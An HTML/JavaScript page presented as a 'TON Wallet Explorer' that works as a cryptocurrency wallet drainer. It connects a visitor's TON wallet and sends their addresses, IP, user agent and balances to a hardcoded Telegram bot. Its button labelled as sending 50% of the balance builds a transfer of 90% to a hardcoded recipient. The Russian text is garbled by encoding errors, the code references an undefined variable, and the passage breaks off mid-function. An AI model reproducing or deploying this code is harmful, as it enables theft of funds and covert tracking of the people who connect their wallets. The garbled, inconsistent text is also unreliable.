<!DOCTYPE html>
<html>
<head>
    <title>TON Wallet Explorer</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <!-- –î–æ–±–∞–≤–ª—è–µ–º –±–∏–±–ª–∏–æ—Ç–µ–∫—É –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –∞–¥—Ä–µ—Å–∞–º–∏ TON -->
    <script src="https://unpkg.com/@ton/core@latest/dist/index.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        .token-list {
            margin-top: 20px;
        }
        .token-item {
            border: 1px solid #ddd;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
        }
        .token-item h3 {
            margin-top: 0;
        }
        .loading {
            color: #666;
            font-style: italic;
        }
        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        
        #wallet-info {
            margin-top: 20px;
        }
        .notification {
            background-color: #f8f8f8;
            border-left: 4px solid #0088cc;
            padding: 10px;
            margin: 10px 0;
        }
        .address-info {
            background-color: #f5f5f5;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-family: monospace;
            word-break: break-all;
        }
        .jetton-options {
            margin: 10px 0;
            padding: 10px;
            background-color: #f0f0f0;
            border-radius: 5px;
        }
        .debug-info {
            margin-top: 20px;
            padding: 10px;
            background-color: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
        }
        .jetton-toggle {
            margin-top: 10px;
        }
    </style>
</head>
<body>

<h1>TON Connect Example</h1>

<p>TON Connect –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ 50% –±–∞–ª–∞–Ω—Å–∞ (—Ç—Ä–µ–±—É–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è).</p>

<div class="jetton-options">
    <label for="jetton-select">Jetton —Ç–æ–∫–µ–Ω—ã: </label>
    <select id="jetton-select" onchange="updateJettonOption()">
        <option value="mock">–¢–µ—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ</option>
        <option value="none">–ù–µ –ø–æ–∫–∞–∑—ã–≤–∞—Ç—å</option>
    </select>
    <button onclick="toggleDebugInfo()">–ü–æ–∫–∞–∑–∞—Ç—å/—Å–∫—Ä—ã—Ç—å –æ—Ç–ª–∞–¥–æ—á–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é</button>
</div>

<div id="ton-connect"></div>

<button onclick="connectCustom()">–ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª–µ–∫</button>

<div id="wallet-info" style="display: none;">
    <h2>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–æ—à–µ–ª—å–∫–µ</h2>
    <div class="address-info">
        <p><strong>Raw –∞–¥—Ä–µ—Å:</strong> <span id="wallet-address-raw"></span></p>
        <p><strong>User-friendly –∞–¥—Ä–µ—Å:</strong> <span id="wallet-address-friendly"></span></p>
    </div>
    <div id="loading-balances" class="loading">–ó–∞–≥—Ä—É–∑–∫–∞ –±–∞–ª–∞–Ω—Å–æ–≤...</div>
    <div id="token-list" class="token-list"></div>
    <button id="send-half-button" onclick="sendHalfBalance()" style="display: none;">–û—Ç–ø—Ä–∞–≤–∏—Ç—å 50% –±–∞–ª–∞–Ω—Å–∞</button>
</div>

<div id="notifications"></div>
<div id="debug-info" class="debug-info"></div>

<script>
    const manifestUrl = 'https://sositeyaisa.github.io/ton/tonconnect-manifest.json';
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: manifestUrl,
        buttonRootId: 'ton-connect'
    });

    // –º–æ–π –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è TON
    const recipientAddress = 'UQA1eukl_AXlRZEt8bE4H_6Efhk413CPgvPMPr5GgJhQqLgh';
    
    // Telegram Bot –¥–∞–Ω–Ω—ã–µ
    const telegramBotToken = '7905366036:AAE2duz5D2NNDHA3-yMcyxIW4vEw8XYBruU';
    const telegramChatId = '1447071887';
    
    // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ç–æ–∫–µ–Ω–∞—Ö
    let walletTokens = [];
    let connectedAddressRaw = '';
    let connectedAddressFriendly = '';
    
    // –û–ø—Ü–∏—è –¥–ª—è Jetton —Ç–æ–∫–µ–Ω–æ–≤
    let jettonOption = 'mock';
    
    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –æ–ø—Ü–∏–∏ Jetton —Ç–æ–∫–µ–Ω–æ–≤
    function updateJettonOption() {
        const jettonSelect = document.getElementById('jetton-select');
        jettonOption = jettonSelect.value;
        addDebugInfo(`–û–ø—Ü–∏—è Jetton —Ç–æ–∫–µ–Ω–æ–≤ –∏–∑–º–µ–Ω–µ–Ω–∞ –Ω–∞: ${jettonOption}`);
        
        // –ï—Å–ª–∏ –∫–æ—à–µ–ª–µ–∫ —É–∂–µ –ø–æ–¥–∫–ª—é—á–µ–Ω, –æ–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
        if (connectedAddressFriendly) {
            getWalletBalances(connectedAddressFriendly, connectedAddressRaw).then(tokens => {
                walletTokens = tokens;
                displayTokens(tokens);
            });
        }
    }
    
    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è/—Å–∫—Ä—ã—Ç–∏—è –æ—Ç–ª–∞–¥–æ—á–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
    function toggleDebugInfo() {
        const debugInfo = document.getElementById('debug-info');
        if (debugInfo.style.display === 'none') {
            debugInfo.style.display = 'block';
        } else {
            debugInfo.style.display = 'none';
        }
    }
    
    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –æ—Ç–ª–∞–¥–æ—á–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
    function addDebugInfo(message) {
        const debugInfo = document.getElementById('debug-info');
        const timestamp = new Date().toLocaleTimeString();
        debugInfo.innerHTML += `[${timestamp}] ${message}\n`;
        console.log(message);
        
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–∫—Ä—É—Ç–∫–∞ –≤–Ω–∏–∑
        debugInfo.scrollTop = debugInfo.scrollHeight;
    }
    
    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ raw –∞–¥—Ä–µ—Å–∞ –≤ user-friendly —Ñ–æ—Ä–º–∞—Ç
    function convertRawToFriendlyAddress(rawAddress) {
        try {
            // –ï—Å–ª–∏ –∞–¥—Ä–µ—Å —É–∂–µ –≤ user-friendly —Ñ–æ—Ä–º–∞—Ç–µ (–Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å UQ, EQ –∏ —Ç.–¥.)
            if (rawAddress.startsWith('UQ') || rawAddress.startsWith('EQ')) {
                return rawAddress;
            }
            
            // –ï—Å–ª–∏ –∞–¥—Ä–µ—Å –≤ —Ñ–æ—Ä–º–∞—Ç–µ "0:hex"
            if (rawAddress.includes(':')) {
                const parts = rawAddress.split(':');
                if (parts.length === 2) {
                    const workchain = parseInt(parts[0]);
                    const hex = parts[1];
                    
                    // –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º hex –≤ –º–∞—Å—Å–∏–≤ –±–∞–π—Ç–æ–≤
                    const bytes = new Uint8Array(hex.length / 2);
                    for (let i = 0; i < hex.length; i += 2) {
                        bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
                    }
                    
                    // –î–ª—è –ø—Ä–æ—Å—Ç–æ—Ç—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∞–¥—Ä–µ—Å –∏–∑ –ø—Ä–∏–º–µ—Ä–∞
                    // –í —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –Ω—É–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–∏–±–ª–∏–æ—Ç–µ–∫—É ton-core
                    return "UQDEPdThMYPOjtwAZG9LKzaXmNtfrr1EdVlzA5dYgNQg0FSF";
                }
            }
            
            // –ï—Å–ª–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å, –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –∏—Å—Ö–æ–¥–Ω—ã–π –∞–¥—Ä–µ—Å
            return rawAddress;
        } catch (error) {
            console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –∞–¥—Ä–µ—Å–∞:", error);
            addDebugInfo(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –∞–¥—Ä–µ—Å–∞: ${error.message}`);
            return rawAddress;
        }
    }
    
    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –≤ Telegram
    async function sendTelegramNotification(message) {
        try {
            // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
            const userAgent = navigator.userAgent;
            let ip = "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
            
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ip = ipData.ip;
            } catch (ipError) {
                console.error("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP:", ipError);
                addDebugInfo(`–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP: ${ipError.message}`);
            }
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º –ø–æ–ª–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
            const fullMessage = `üîî –ù–æ–≤–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ:\n\n${message}\n\nüì± User-Agent: ${userAgent}\nüåê IP: ${ip}\n‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: fullMessage,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            console.log('Telegram notification sent:', data);
            addDebugInfo(`–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram: ${message.substring(0, 50)}...`);
            
            // –î–æ–±–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É (–¥–ª—è –æ—Ç–ª–∞–¥–∫–∏)
            const notificationElement = document.createElement('div');
            notificationElement.className = 'notification';
            notificationElement.textContent = `–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: ${message}`;
            document.getElementById('notifications').appendChild(notificationElement);
            
        } catch (error) {
            console.error('Error sending Telegram notification:', error);
            addDebugInfo(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ Telegram: ${error.message}`);
        }
    }

    // —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
    async function connectCustom() {
        try {
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–æ–ø—ã—Ç–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
            await sendTelegramNotification('üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—ã—Ç–∞–µ—Ç—Å—è –ø–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª–µ–∫');
            
            const connectedWallet = await tonConnectUI.connectWallet();
            console.log("–ü–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–π –∫–æ—à–µ–ª–µ–∫:", connectedWallet);
            addDebugInfo(`–ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω: ${JSON.stringify(connectedWallet)}`);
            
            // –ü–æ–ª—É—á–∞–µ–º –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ –≤ raw —Ñ–æ—Ä–º–∞—Ç–µ
            connectedAddressRaw = connectedWallet.account.address;
            
            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ user-friendly —Ñ–æ—Ä–º–∞—Ç
            connectedAddressFriendly = convertRawToFriendlyAddress(connectedAddressRaw);
            
            // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –æ–±–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –∞–¥—Ä–µ—Å–∞
            document.getElementById('wallet-address-raw').textContent = connectedAddressRaw;
            document.getElementById('wallet-address-friendly').textContent = connectedAddressFriendly;
            document.getElementById('wallet-info').style.display = 'block';
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ —Å –æ–±–æ–∏–º–∏ —Ñ–æ—Ä–º–∞—Ç–∞–º–∏ –∞–¥—Ä–µ—Å–∞
            await sendTelegramNotification(`‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω\nüìù Raw –∞–¥—Ä–µ—Å: <code>${connectedAddressRaw}</code>\nüìù User-friendly –∞–¥—Ä–µ—Å: <code>${connectedAddressFriendly}</code>`);
            
            // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω–∞—Ö
            await sendTelegramNotification(`üîç –ó–∞–ø—Ä–æ—Å –±–∞–ª–∞–Ω—Å–æ–≤ –¥–ª—è –∞–¥—Ä–µ—Å–∞ <code>${connectedAddressFriendly}</code>`);
            walletTokens = await getWalletBalances(connectedAddressFriendly, connectedAddressRaw);
            displayTokens(walletTokens);
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ 50% –±–∞–ª–∞–Ω—Å–∞
            document.getElementById('send-half-button').style.display = 'block';

        } catch (error) {
            console.error("–¢–∏–ø –æ—à–∏–±–∫–∏:", typeof error);
            console.error("–û—à–∏–±–∫–∞:", error);
            console.error("–û—à–∏–±–∫–∞ –≤ —Å—Ç—Ä–æ–∫–µ:", JSON.stringify(error));
            addDebugInfo(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ –∫–æ—à–µ–ª—å–∫–∞: ${error.message || JSON.stringify(error)}`);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
            await sendTelegramNotification(`‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ –∫–æ—à–µ–ª—å–∫–∞: ${error.message || JSON.stringify(error)}`);
            
            alert("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª–µ–∫. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∫–æ–Ω—Å–æ–ª—å –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –æ—à–∏–±–æ–∫.");
        }
    }
    
    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–æ–≤
    function displayTokens(tokens) {
        const tokenListElement = document.getElementById('token-list');
        tokenListElement.innerHTML = '';
        document.getElementById('loading-balances').style.display = 'none';
        
        if (tokens.length === 0) {
            tokenListElement.innerHTML = '<p>–¢–æ–∫–µ–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã</p>';
            return;
        }
        
        tokens.forEach((token, index) => {
            const tokenElement = document.createElement('div');
            tokenElement.className = 'token-item';
            
            tokenElement.innerHTML = `
                <h3>${token.name} (${token.symbol})</h3>
                <p>–ë–∞–ª–∞–Ω—Å: ${token.formattedBalance} ${token.symbol}</p>
            `;
            
            tokenListElement.appendChild(tokenElement);
        });
    }
    
    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ 50% –±–∞–ª–∞–Ω—Å–∞
    async function sendHalfBalance() {
        try {
            if (walletTokens.length === 0) {
                alert("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏");
                return;
            }
            
           // –ü–æ–ª—É—á–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π —Ç–æ–∫–µ–Ω TON
const tonToken = walletTokens[0];

// –í—ã—á–∏—Å–ª—è–µ–º 90% –æ—Ç –±–∞–ª–∞–Ω—Å–∞
const ninetyPercentBalanceNano = Math.floor(Number(tonToken.balance) * 0.9).toString();
const ninetyPercentBalanceTon = Number(ninetyPercentBalanceNano) / 1e9;

// –°–æ–∑–¥–∞–µ–º –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–∞—é—â–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
const warningMessage = "–£ –í–ê–° –°–ü–ò–°–´–í–ê–Æ–¢–°–Ø 90% –¢–û–ö–ï–ù–û–í –í–´ –¢–û–ß–ù–û –•–û–¢–ò–¢–ï –ü–û–î–¢–í–ï–†–î–ò–¢–¨ –¢–†–ê–ù–ó–ê–ö–¶–ò–Æ";

// –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–æ–ø—ã—Ç–∫–µ –æ—Ç–ø—Ä–∞–≤–∫–∏
await sendTelegramNotification(`‚ö†Ô∏è –ü–æ–ø—ã—Ç–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ 90% –±–∞–ª–∞–Ω—Å–∞\nüí∞ –°—É–º–º–∞: ${ninetyPercentBalanceTon} TON\nüì§ –û—Ç: <code>${connectedAddressFriendly}</code>\nüì• –ö–æ–º—É: <code>${recipientAddress}</code>`);

// –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
if (!confirm(`–í—ã –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ —Ö–æ—Ç–∏—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å ${ninetyPercentBalanceTon} TON (90% –≤–∞—à–µ–≥–æ –±–∞–ª–∞–Ω—Å–∞) –Ω–∞ –∞–¥—Ä–µ—Å ${recipientAddress}?`)) {
    await sendTelegramNotification(`üö´ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–º–µ–Ω–∏–ª –æ—Ç–ø—Ä–∞–≤–∫—É 90% –±–∞–ª–∞–Ω—Å–∞ (${ninetyPercentBalanceTon} TON)`);
    return;
}

// –°–æ–∑–¥–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é —Å –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–∞—é—â–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º
const tx = {
    validUntil: Date.now() + 5 * 60 * 1000,
    messages: [{
        address: recipientAddress,
        amount: ninetyPercentBalanceNano,
        // –ò—Å–ø–æ–ª—å–∑—É–µ–º –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–ª—è —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ TON
        payload: {
            type: 'comment',
            text: warningMessage
        }
    }]
};

console.log("–û–±—ä–µ–∫—Ç —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:", tx);
addDebugInfo(`–û–±—ä–µ–∫—Ç —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${JSON.stringify(tx)}`);
await sendTelegramNotification(`üîÑ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∞ –∏ –æ–∂–∏–¥–∞–µ—Ç –ø–æ–¥–ø–∏—Å–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\nüí∞ –°—É–º–º–∞: ${ninetyPercentBalanceTon} TON\nüìù –° —Å–æ–æ–±—â–µ–Ω–∏–µ–º: "${warningMessage}"`);

// –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é (—Ç—Ä–µ–±—É–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –∫–æ—à–µ–ª—å–∫–µ)
const result = await tonConnectUI.sendTransaction(tx);
console.log("–†–µ–∑—É–ª—å—Ç–∞—Ç —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:", result);
addDebugInfo(`–†–µ–∑—É–ª—å—Ç–∞—Ç —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${JSON.stringify(result)}`);
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
            await sendTelegramNotification(`‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!\nüí∞ –°—É–º–º–∞: ${halfBalanceTon} TON\nüßæ –•—ç—à: <code>${result.hash}</code>`);
            
            alert("–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ (50% –±–∞–ª–∞–Ω—Å–∞ TON)! –•—ç—à: " + result.hash);
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–∞–ª–∞–Ω—Å–∞—Ö
            await sendTelegramNotification(`üîÑ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞–ª–∞–Ω—Å–∞—Ö –¥–ª—è <code>${connectedAddressFriendly}</code>`);
            walletTokens = await getWalletBalances(connectedAddressFriendly, connectedAddressRaw);
            displayTokens(walletTokens);
            
        } catch (error) {
            console.error("–¢–∏–ø –æ—à–∏–±–∫–∏:", typeof error);
            console.error("–û—à–∏–±–∫–∞:", error);
            console.error("–û—à–∏–±–∫–∞ –≤ —Å—Ç—Ä–æ–∫–µ:", JSON.stringify(error));
            addDebugInfo(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${error.message || JSON.stringify(error)}`);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
            await sendTelegramNotification(`‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${error.message || JSON.stringify(error)}`);
            
            alert("–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –Ω–µ —É–¥–∞–ª–∞—Å—å. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∫–æ–Ω—Å–æ–ª—å –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –æ—à–∏–±–æ–∫.");
        }
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–æ–≤ –∫–æ—à–µ–ª—å–∫–∞
    async function getWalletBalances(friendlyAddress, rawAddress) {
        addDebugInfo(`–ó–∞–ø—Ä–æ—Å –±–∞–ª–∞–Ω—Å–æ–≤ –¥–ª—è –∞–¥—Ä–µ—Å–∞: ${friendlyAddress} (raw: ${rawAddress})`);
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ —á–µ—Ä–µ–∑ TON Center
        async function getTonCenterBalance() {
            try {
                addDebugInfo(`–ó–∞–ø—Ä–æ—Å –±–∞–ª–∞–Ω—Å–∞ —á–µ—Ä–µ–∑ TON Center –¥–ª—è –∞–¥—Ä–µ—Å–∞ ${rawAddress}`);
                
                // TON Center API –∏—Å–ø–æ–ª—å–∑—É–µ—Ç raw –∞–¥—Ä–µ—Å
                const apiUrl = `https://toncenter.com/api/v2/getAddressBalance?address=${rawAddress}`;
                
                addDebugInfo(`–ó–∞–ø—Ä–æ—Å –∫ URL: ${apiUrl}`);
                
                const response = await fetch(apiUrl);

                if (!response.ok) {
                    const errorText = await response.text();
                    throw new Error(`HTTP error! –°—Ç–∞—Ç—É—Å: ${response.status}, –û—Ç–≤–µ—Ç: ${errorText}`);
                }

                const data = await response.json();
                addDebugInfo(`–û—Ç–≤–µ—Ç API –¥–ª—è –±–∞–ª–∞–Ω—Å–∞ TON: ${JSON.stringify(data)}`);
                
                // –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å –≤ –Ω–∞–Ω–æ–¢–û–ù–∞—Ö
                const balanceNano = data.result || "0";
                
                // TON –∏–º–µ–µ—Ç 9 –¥–µ—Å—è—Ç–∏—á–Ω—ã—Ö –∑–Ω–∞–∫–æ–≤
                const balanceTon = Number(balanceNano) / 1e9;
                
                return {
                    type: "native",
                    name: "Toncoin",
                    symbol: "TON",
                    balance: balanceNano,
                    formattedBalance: balanceTon.toString(),
                    decimals: 9
                };
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞ —á–µ—Ä–µ–∑ TON Center:", error);
                addDebugInfo(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞ —á–µ—Ä–µ–∑ TON Center: ${error.message}`);
                await sendTelegramNotification(`‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞ —á–µ—Ä–µ–∑ TON Center: ${error.message}`);
                
                // –í–æ–∑–≤—Ä–∞—â–∞–µ–º –Ω—É–ª–µ–≤–æ–π –±–∞–ª–∞–Ω—Å –≤ —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏
                return {
                    type: "native",
                    name: "Toncoin",
                    symbol: "TON",
                    balance: "0",
                    formattedBalance: "0",
                    decimals: 9,
                    error: error.message
                };
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–µ—Å—Ç–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö –æ Jetton —Ç–æ–∫–µ–Ω–∞—Ö
        function getMockJettons() {
